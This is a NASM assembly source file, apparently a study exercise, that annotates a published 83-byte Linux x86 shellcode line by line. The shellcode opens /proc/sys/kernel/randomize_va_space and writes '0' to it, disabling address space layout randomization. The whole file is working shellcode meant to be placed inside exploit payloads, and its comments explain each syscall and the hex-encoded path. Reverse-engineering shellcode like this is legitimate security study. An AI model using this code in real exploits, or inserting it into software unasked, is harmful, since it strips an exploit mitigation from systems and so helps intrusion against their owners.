; Filename: offASLR.nasm
; Author:   boku
; Purpose:  Reverse Engineered NASM version of Jean Pascal Pereiras
;  Linux x86 ASLR deactivation - 83 bytes
; Original: http://shell-storm.org/shellcode/files/shellcode-813.php
global _start
section .text:
_start:
xor    eax,eax    ; clears eax register
push   eax        ; pushes Null onto stack
                  ; Null terminates the string
push   0x65636170
;  python -c 'print "65636170".decode("hex")'
;    ecap
push   0x735f6176
;  python -c 'print "735f6176".decode("hex")'
;    s_av
push   0x5f657a69
;  python -c 'print "5f657a69".decode("hex")'
;    _ezi
push   0x6d6f646e
;  python -c 'print "6d6f646e".decode("hex")'
;    modn
push   0x61722f6c
;  python -c 'print "61722f6c".decode("hex")'
;    ar/l
push   0x656e7265
;  python -c 'print "656e7265".decode("hex")'
;    enre
push   0x6b2f7379
;  python -c 'print "6b2f7379".decode("hex")'
;    k/sy
push   0x732f636f
;  python -c 'print "732f636f".decode("hex")'
;    s/co
push   0x72702f2f
;  python -c 'print "72702f2f".decode("hex")'
;    rp//
; Full String:  //proc/sys/kernel/randomize_va_space
mov    ebx,esp   ; Puts the memory location of our string that
                 ;  is on top of the stack into the ebx register
mov    cx,0x2bc  ; the arguement for the variable `mode_t mode`
                 ; 0x2bc = 700 (deci) = 1274 (ocatal)
; Probably inteded mode argument was for:
; S_IRWXU  00700 user (file owner) has read, write and execute permission
; from man 2 creat:
; Note that this mode only applies to future accesses of the newly created file
; Since the creat() function is being used to open and not create a file,
;  this argument probably does not matter. My guess is it should be
;  in octal 700, and not decimal 700.
mov    al,0x8    ; creat systemcall
; /usr/include/i386-linux-gnu/asm/unistd_32.h
; #define __NR_creat                8
; man 2 creat
; open, creat - open and possibly create a file or device
; int creat(const char *pathname, mode_t mode);
;     EAX         EBX               ECX
; mode specifies the permissions to use in case a new file is created.
int    0x80      ; Systemcall Interrupt

; man 2 write
; write - write to a file descriptor
; ssize_t write(int fd, const void *buf, size_t count);
;         EAX     EBX       ECX             EDX
mov    ebx,eax   ; moves the file descripter returned from the
; creat systemcall to the ebx register.
push   eax       ; pushes the file descripter onto the stack
mov    dx,0x3a30
push   dx
mov    ecx,esp   ; points ecx register to the top of the stack
; stack is loaded for the const void *buff arguement
xor    edx,edx   ; Clears the edx register
inc    edx       ; edx is now 1
mov    al,0x4    ; write systemcall
; /usr/include/i386-linux-gnu/asm/unistd_32.h
; #define __NR_write                4
int    0x80      ; Systemcall Interrupt

; man 2 close
; close - close a file descriptor
; int close(int fd);
mov    al,0x6     ; close systemcall
; /usr/include/i386-linux-gnu/asm/unistd_32.h
; #define __NR_close                6
int    0x80       ; Systemcall Interrupt

; man 2 pidwait
;        pid_t wait(int *status);
;  wait, waitpid, waitid - wait for process to change state
inc    eax        ; waitpid systemcall
; /usr/include/i386-linux-gnu/asm/unistd_32.h
; #define __NR_waitpid              7
int    0x80       ; Systemcall Interrupt
